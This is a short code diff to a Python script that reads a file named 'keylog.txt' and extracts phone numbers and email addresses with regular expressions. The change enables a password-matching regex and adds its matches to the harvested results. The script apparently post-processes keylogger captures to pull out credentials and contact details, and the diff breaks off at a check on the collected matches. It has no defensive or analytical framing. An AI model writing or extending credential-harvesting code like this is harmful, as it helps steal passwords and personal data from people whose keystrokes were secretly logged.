@@ -19,13 +19,12 @@ with open("keylog.txt", "r") as keylog:
         (\.[a-zA-Z]{2,4})               # dot-something
     )''', re.VERBOSE)
 
-
-#    passwordRegex = re.compile('''(
-#        ^(?=.*?\d)                      # at least one digit
-#        (?=.*?[A-Z])                    # at lease one uppercase
-#        (?=.*?[a-z])                    # at least one lowercase
-#        [A-Za-z\d]{10,}$                # at least 10 characters
-#    )''', re.VERBOSE)
+    passwordRegex = re.compile('''(
+        ^(?=.*?\d)                      # at least one digit
+        (?=.*?[A-Z])                    # at lease one uppercase
+        (?=.*?[a-z])                    # at least one lowercase
+        [A-Za-z\d]{10,}$                # at least 10 characters
+    )''', re.VERBOSE)
 
     matches = []
     for groups in phoneRegex.findall(data):
@@ -34,6 +33,8 @@ with open("keylog.txt", "r") as keylog:
             phoneNum += ' x' + groups[8]
             matches.append(phoneNum)
     for groups in emailRegex.findall(data):
+        matches.append(groups[0])
+    for groups in passwordRegex.findall(data):
         matches.append(groups[0])
 
     if len(matches) > 0:
